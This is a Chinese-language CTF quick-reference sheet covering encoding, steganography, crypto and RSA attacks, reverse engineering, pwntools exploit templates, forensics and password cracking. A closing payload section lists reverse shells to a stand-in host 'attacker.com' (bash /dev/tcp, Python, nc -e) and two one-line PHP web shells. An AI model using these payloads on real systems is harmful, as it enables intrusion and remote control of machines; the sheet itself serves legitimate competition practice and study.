# CTF竞赛技巧速查

## 题型分类

| 类别 | 核心技能 | 常用工具 |
|------|---------|---------|
| **Crypto** | 密码学、编码识别 | CyberChef, RsaCtfTool, SageMath |
| **Web** | Web漏洞、逻辑分析 | Burp, SQLMap, 浏览器DevTools |
| **Pwn** | 二进制漏洞、ROP | Pwntools, GDB, IDA |
| **Reverse** | 逆向工程、反汇编 | IDA, Ghidra, Radare2 |
| **Forensics** | 流量分析、隐写 | Wireshark, Binwalk, Steghide |
| **Misc** | 杂项、取证、编码 | CyberChef, Python |

## 编码识别与解码

### 常见编码特征

| 编码 | 特征 | 示例 |
|------|------|------|
| Base64 | A-Z,a-z,0-9,+,/,= | `dGVzdA==` |
| Base32 | A-Z,2-7,= | `ORSXG5A=` |
| Base58 | 无0,O,I,l,+ | (比特币地址) |
| Hex | 0-9,A-F | `74657374` |
| URL | %XX | `%74%65%73%74` |
| HTML | &#XX; | `&#116;` |
| Morse | .-/-... | `...` |

### 解码工具

```bash
# Base64
echo "dGVzdA==" | base64 -d

# Hex
xxd -r -p <<< "74657374"

# URL
python3 -c "import urllib.parse; print(urllib.parse.unquote('%74%65%73%74'))"

# ROT13
echo "test" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# CyberChef
# https://gchq.github.io/CyberChef/
```

## 隐写术 (Steganography)

### 图片隐写

```bash
# 基础检查
file image.png
exiftool image.png
strings image.png | grep flag
binwalk image.png

# LSB隐写
zsteg image.png
zsteg -a image.png

# Steghide (需要密码)
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p password

# Outguess
outguess -r image.jpg output.txt

# Python提取LSB
from PIL import Image
img = Image.open('image.png')
pixels = img.load()
# 提取LSB...
```

### 音频隐写

```bash
# 频谱分析
sonic-visualiser audio.wav

# LSB音频
steghide extract -sf audio.wav

# 摩斯电码
# 使用Audacity查看波形

# 播放速度调整
ffmpeg -i audio.wav -filter:a "atempo=0.5" slow.wav
ffmpeg -i audio.wav -filter:a "atempo=2.0" fast.wav
```

### 其他载体

```bash
# PDF隐写
pdf-parser.py file.pdf

# 压缩包隐写
binwalk -e archive.zip
foremost -i file.data

# NTFS隐写 (ADS)
dir /r
more < file.txt:stream_name
```

## 密码学 (Crypto)

### 古典密码

```bash
# 凯撒密码
# 尝试所有位移
cat cipher | caesar

# 频率分析
# https://www.dcode.fr/frequency-analysis

# Vigenere
# 先猜密钥长度 (Kasiski, IC)
# 然后分段凯撒

# 仿射密码
# https://www.dcode.fr/affine-cipher
```

### 现代密码

**RSA攻击**
```bash
# 使用RsaCtfTool
python RsaCtfTool.py --publickey key.pem --private
python RsaCtfTool.py --publickey key.pem --uncipherfile cipher.bin

# 常见攻击
# - 小公钥指数 e=3
# - 共模攻击
# - 公因数分解
# - Wiener攻击 (d较小)
# - Boneh-Durfee攻击
```

**AES解密**
```bash
openssl enc -d -aes-256-cbc -in encrypted.bin -out decrypted.txt -K key -iv iv
```

**XOR**
```bash
# 已知明文攻击
# 密文 XOR 明文 = 密钥

# 单字节XOR
cat cipher | xortool -c 20

# 多字节XOR
cat cipher | xortool -l 10
```

### 哈希识别与破解

```bash
# 识别hash类型
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# 在线破解
# https://crackstation.net/
# https://hashes.org/

# 本地破解
john --format=Raw-MD5 hash.txt
hashcat -m 0 hash.txt wordlist.txt
```

## 逆向工程 (Reverse)

### 静态分析

```bash
# 文件信息
file binary
binwalk binary
strings binary | grep flag

# 反汇编
objdump -d binary
objdump -M intel -d binary

# Radare2
r2 -A binary
[0x00000000]> s main
[0x00000000]> pdf
[0x00000000]> iz  # 字符串

# Ghidra/IDA
# F5反编译，分析逻辑
```

### 动态调试

```bash
# GDB基础
gdb ./binary
(gdb) disas main
(gdb) b main
(gdb) r
(gdb) n
(gdb) x/s $rdi

# GDB PEDA
peda$ pattern_create 200
peda$ pattern_offset AAAA

# ltrace / strace
ltrace ./binary
strace ./binary
```

## 二进制漏洞利用 (Pwn)

### 基础检查

```bash
checksec ./binary
# RELRO: 重定位只读
# STACK CANARY: 栈保护
# NX: 不可执行栈
# PIE: 位置无关代码
```

### Pwntools模板

```python
from pwn import *

# 连接
p = remote('target.com', 1337)
# p = process('./binary')
# p = gdb.debug('./binary')

# 接收/发送
p.recvuntil(':')
p.sendline(b'payload')

# ROP
rop = ROP(binary)
rop.call(elf.symbols['system'], [next(elf.search(b'/bin/sh'))])

# Shellcode
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# 交互
p.interactive()
```

### 常见漏洞

```python
# 栈溢出
payload = b'A' * offset + p64(ret_addr)

# 格式化字符串
payload = b'%x.' * 20
payload = fmtstr_payload(6, {elf.got['puts']: elf.symbols['system']})

# 堆利用
# UAF, Double Free, Fastbin Attack
```

## 取证分析 (Forensics)

### 内存取证

```bash
# Volatility
vol.py -f memory.dmp imageinfo
vol.py -f memory.dmp --profile=Win7SP1x64 pslist
vol.py -f memory.dmp --profile=Win7SP1x64 cmdscan
vol.py -f memory.dmp --profile=Win7SP1x64 filescan
vol.py -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q 0x... -D ./
```

### 网络取证

```bash
# 分析
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap -Y "tcp.port == 21" -T fields -e ftp.request.command

# 提取文件
foremost -i capture.pcap
# Wireshark: File → Export Objects

# USB流量
# 键盘: tshark -r usb.pcap -T fields -e usb.capdata
```

## 杂项技巧

### 二维码

```bash
# 生成
qrencode -o qr.png "flag{...}"

# 识别
zbarimg qr.png

# 损坏修复
# 使用QR Code Error Correction
```

### 压缩包破解

```bash
# Zip密码
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
zip2john file.zip > hash.txt
john hash.txt

# 明文攻击
pkcrack -c encrypted_file -p plaintext_file -C encrypted.zip -P plaintext.zip
```

### 文档隐写

```bash
# Office
unzip document.docx -d docx/
cat docx/word/document.xml

# PDF
pdf-parser.py file.pdf
```

## 常用Payload

### 反弹Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 一句话
nc -e /bin/sh attacker.com 4444
```

### WebShell

```php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
```

## 在线工具

| 工具 | 用途 |
|------|------|
| [CyberChef](https://gchq.github.io/CyberChef/) | 万能编码解码 |
| [CrackStation](https://crackstation.net/) | 哈希破解 |
| [dCode](https://www.dcode.fr/) | 密码学工具 |
| [CTFtime](https://ctftime.org/) | CTF日历与排名 |
| [GTFOBins](https://gtfobins.github.io/) | Unix提权 |
| [LOLBAS](https://lolbas-project.github.io/) | Windows利用 |

## 参考资源

- [CTF Wiki](https://ctf-wiki.org/)
- [CTF Field Guide](https://trailofbits.github.io/ctf/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
